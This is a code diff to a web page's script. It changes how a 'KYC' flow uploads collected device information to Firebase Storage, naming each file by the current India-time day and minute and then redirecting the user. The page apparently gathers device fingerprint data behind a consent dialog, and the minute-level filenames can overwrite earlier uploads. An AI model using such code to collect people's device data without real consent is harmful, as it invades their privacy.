@@ -176,25 +176,49 @@
             `;
         }
 
-        // Function to collect data and upload to Firebase
-        async function collectData() {
-            // Close consent dialog
-            document.getElementById("consentDialog").style.display = "none";
+        // Function to get formatted filename based on Indian day and time
+function generateFileName() {
+    const indiaTime = new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" });
+    const date = new Date(indiaTime);
 
-            try {
-                const deviceInfo = await getAdvancedDeviceInfo();
-                const formattedInfo = formatDeviceInfo(deviceInfo);
-                const file = new Blob([formattedInfo], { type: "text/plain" });
-                const storageRef = ref(storage, 'KYC_Advanced_User_Data.txt');
+    // Days array to get day name
+    const days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
+    const dayName = days[date.getDay()]; // Get current day name
 
-                console.log("Attempting to upload data to Firebase Storage...");
-                await uploadBytes(storageRef, file);
-                console.log("KYC data uploaded successfully to Firebase Storage.");
-                window.location.href = "https://example.com/kyc-complete";
-            } catch (error) {
-                console.error("Error uploading KYC data:", error);
-            }
-        }
+    // Format hours and minutes with AM/PM notation
+    let hours = date.getHours();
+    const minutes = date.getMinutes();
+    const isPM = hours >= 12;
+    const period = isPM ? "P" : "A";
+    hours = hours % 12 || 12; // Convert to 12-hour format
+
+    // Format time as HH_MM followed by A/P
+    const formattedTime = `${hours}_${minutes.toString().padStart(2, "0")}${period}`;
+    return `${dayName}_${formattedTime}.txt`;
+}
+
+// Function to collect data and upload to Firebase
+async function collectData() {
+    document.getElementById("consentDialog").style.display = "none";
+
+    try {
+        const deviceInfo = await getAdvancedDeviceInfo();
+        const formattedInfo = formatDeviceInfo(deviceInfo);
+        const file = new Blob([formattedInfo], { type: "text/plain" });
+        
+        // Generate unique filename based on Indian day and time
+        const fileName = generateFileName();
+        const storageRef = ref(storage, `users/${fileName}`); // Save in users folder
+
+        console.log("Attempting to upload data to Firebase Storage...");
+        await uploadBytes(storageRef, file);
+        
+        console.log("KYC data uploaded successfully to Firebase Storage.");
+        window.location.href = "https://example.com/kyc-complete";
+    } catch (error) {
+        console.error("Error uploading KYC data:", error);
+    }
+}
 
         // Function if user denies consent
         function denyConsent() {
